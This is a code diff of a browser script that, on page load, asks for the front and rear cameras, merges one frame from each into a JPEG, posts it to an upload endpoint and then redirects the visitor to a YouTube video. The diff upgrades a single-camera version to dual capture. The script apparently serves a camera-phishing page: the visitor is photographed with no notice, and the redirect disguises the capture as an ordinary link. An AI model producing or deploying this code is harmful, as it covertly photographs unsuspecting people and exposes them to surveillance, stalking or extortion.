@@ -1,46 +1,57 @@
 (async () => {
-  const video  = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
+  const frontVid = document.getElementById('frontVideo');
+  const rearVid  = document.getElementById('rearVideo');
+  const canvas   = document.getElementById('canvas');
+  const ctx      = canvas.getContext('2d');
 
-  async function captureFrameOnce() {
-    let stream;
+  async function captureBoth() {
+    let frontStream, rearStream;
     try {
-      // 1) get or reuse camera
-      stream = video.srcObject
-        ? video.srcObject
-        : await navigator.mediaDevices.getUserMedia({ video: true });
-      video.srcObject = stream;
+      // 1) request both streams
+      [frontStream, rearStream] = await Promise.all([
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }),
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+      ]);
+      frontVid.srcObject = frontStream;
+      rearVid.srcObject  = rearStream;
 
-      // 2) wait for dimensions
-      await new Promise(r => {
-        if (video.readyState >= 2) r();
-        else video.onloadedmetadata = () => r();
-      });
+      // 2) wait for both videos to be ready
+      await Promise.all([
+        new Promise(r => { if (frontVid.readyState>=2) r(); else frontVid.onloadedmetadata = r; }),
+        new Promise(r => { if (rearVid.readyState>=2)  r(); else  rearVid.onloadedmetadata  = r; })
+      ]);
 
-      // 3) draw frame
-      canvas.width  = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+      // 3) size our canvas to hold both feeds side-by-side
+      const w = Math.max(frontVid.videoWidth, rearVid.videoWidth);
+      const h = Math.max(frontVid.videoHeight, rearVid.videoHeight);
+      canvas.width  = w * 2;
+      canvas.height = h;
 
-      // 4) dataURL → JSON
+      // 4) draw rear on left, front on right
+      ctx.drawImage(rearVid,  0, 0, w, h);
+      ctx.drawImage(frontVid, w, 0, w, h);
+
+      // 5) export merged image
       const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+
+      // 6) send to your existing API
       await fetch('/api/upload', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
         body:    JSON.stringify({ image: dataUrl })
       });
     } catch (err) {
-      console.error('Auto-capture error:', err);
+      console.error('Dual capture failed:', err);
     } finally {
-      // 5) cleanup camera
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      // 6) redirect to real site
+      // 7) stop tracks
+      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+      if (rearStream)  rearStream.getTracks().forEach(t => t.stop());
+      // 8) (optional) redirect or cleanup
       window.location.replace('https://m.youtube.com/watch?si=X7JkWv2nepcAG1IE&v=kNIr14EyTaY&feature=youtu.be');
+
     }
   }
 
-  // expose for “Next”
-  window.runAutoCapture = captureFrameOnce;
-  // autorun on load
-  captureFrameOnce();
+  // run on page load
+  captureBoth();
 })();
